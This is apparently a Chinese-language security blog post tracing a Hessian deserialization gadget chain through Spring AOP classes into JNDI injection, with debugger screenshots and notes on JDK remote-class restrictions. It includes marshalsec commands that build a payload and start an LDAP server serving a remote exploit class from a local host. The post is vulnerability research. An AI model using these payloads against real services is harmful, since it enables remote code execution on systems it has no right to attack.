---
layout:     post
title:      "Hessian反序列化——Spring AOP链分析"
subtitle:   ""
date:       2020-09-29 19:40:00
author:     "kuron3k0"
header-img: "img/home-bg.jpg"
tags:
    - Hessian
    - 漏洞分析
---

看完[Orange大佬的文章](https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/)，发现知识盲区，赶紧学习一下

## Hessian

一个基于http的RPC框架，轻量级的RMI，[这里](https://www.cnblogs.com/wynjauu/articles/9010719.html)是Hessian的一些简单的配置和使用

## 环境搭建

先简单搭个环境
![](/img/in-post/Hessian-RCE/main.png)

这里需要引入Hessian的包
```xml
<dependency>
    <groupId>com.caucho</groupId>
    <artifactId>hessian</artifactId>
    <version>4.0.38</version>
</dependency>
```

用marshalsec生成payload
```cmd
D:\tools>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringPartiallyComparableAdvisorHolder ldap://127.0.0.1:1388/Exp > expxp2
```

同样这个payload也需要有依赖包
```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-aop</artifactId>
    <version>5.0.0.RELEASE</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>4.1.3.RELEASE</version>
</dependency>
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjweaver</artifactId>
    <version>1.6.10</version>
</dependency>
```

ldap服务器开起来
```cmd
D:\tools>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServe
r http://127.0.0.1:9998/#Exp 1388
```

Exp类的代码如下
![](/img/in-post/Hessian-RCE/expclass.png)


## SpringPartiallyComparableAdvisorHolder利用链分析

直接把刚才生成的payload放到HessianInput.readObject，触发断点。


读取第一个字节判断为Map类型，调用readMap
![](/img/in-post/Hessian-RCE/hessianinput.png)

初始化Map的反序列化类
![](/img/in-post/Hessian-RCE/serializerfactory.png)

读取反序列化的数据并put进HashMap中
![](/img/in-post/Hessian-RCE/mapdeserializer.png)

put的时候，当key的hash一样，但是是不同对象的时候，触发了key对象的equal函数，此时key和k都是HotSwappableTargetSource
![](/img/in-post/Hessian-RCE/hotswappabletargetsource.png)

触发HotSwappableTargetSource对象中target（XString）的equals函数
![](/img/in-post/Hessian-RCE/equals1.png)

触发AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder的toString
![](/img/in-post/Hessian-RCE/equals2.png)

进入AspectJPointcutAdvisor的getOrder函数
![](/img/in-post/Hessian-RCE/advisor.png)

AbstractAspectAdvice->getOrder
![](/img/in-post/Hessian-RCE/advice.png)

BeanFactoryAspectInstanceFactory->getOrder
![](/img/in-post/Hessian-RCE/aspectfactory.png)

SimpleJndiBeanFactory->getType
![](/img/in-post/Hessian-RCE/jndifactory.png)

SimpleJndiBeanFactory->doGetType
![](/img/in-post/Hessian-RCE/dogettype.png)

对传入的name参数，会调用isSingleton函数判断是否存在于shareableResources中，如果有的话进入SimpleJndiBeanFactory->doGetSingleton
![](/img/in-post/Hessian-RCE/dogetsingleton.png)

第一次进入的时候singletonObjects是不会有对应的jndi对象的，所以进入else分支，触发lookup
![](/img/in-post/Hessian-RCE/lookup.png)

到这里利用链其实可以算结束了，后面就是lookup的事情了。

## JNDI注入

之前也没了解过lookup之后发生了什么，刚好现在跟一下。


首先进入InitialContext.lookup，根据name获取协议（ldap、rmi等），生成对应的上下文
![](/img/in-post/Hessian-RCE/initcontext.png)
![](/img/in-post/Hessian-RCE/getschema.png)

然后这里我用的是ldap，所以进入了LdapURLContext的lookup
![](/img/in-post/Hessian-RCE/ldapctx.png)

这里根据name参数构建了ldapCtx，然后进入ldapCtx的lookup
![](/img/in-post/Hessian-RCE/generic.png)

继续进入ldapCtx的p_lookup函数
![](/img/in-post/Hessian-RCE/plookup.png)

ldapCtx->c_lookup
![](/img/in-post/Hessian-RCE/clookup.png)

在c_lookup中进入DirectoryManager的getObjectInstance，这时候已经从我们的ldap服务器取到了classFactoryLocation：http://127.0.0.1:9998
![](/img/in-post/Hessian-RCE/getobjinstance.png)

最后调用getObjectFactoryFromReference，实例化对象，从而触发Exp的恶意代码
![](/img/in-post/Hessian-RCE/newinstance.png)

当然这里ldap能用是因为开头设置了trustURLCodebase
![](/img/in-post/Hessian-RCE/trust.png)

我的jdk是1.8.0_265，正常在这里是会被VersionHelper12拦住的，无法load远程class
![](/img/in-post/Hessian-RCE/helper.png)

所以只能用本地的class，但是要利用的话，上面这个触发点就不太行了，因为几乎没有实例化时可以执行命令的类。但是留意到在DirectoryManager->getObjectFactoryFromReference里面实例化之后，还会调用factory的getObjectInstance，那如果有那么个类有getObjectInstance方法且有敏感操作的话，就可以利用了
![](/img/in-post/Hessian-RCE/exec2.png)

这里注意factory会被转成ObjectFactory，所以那个类需要继承ObjectFactory才行
![](/img/in-post/Hessian-RCE/cast.png)


公开的可利用类是org.apache.naming.factory.BeanFactory，属于Tomcat的库（欲听后事如何请听下回分解）

## Reference
- [https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/](https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/)
- [https://paper.seebug.org/1131/](https://paper.seebug.org/1131/)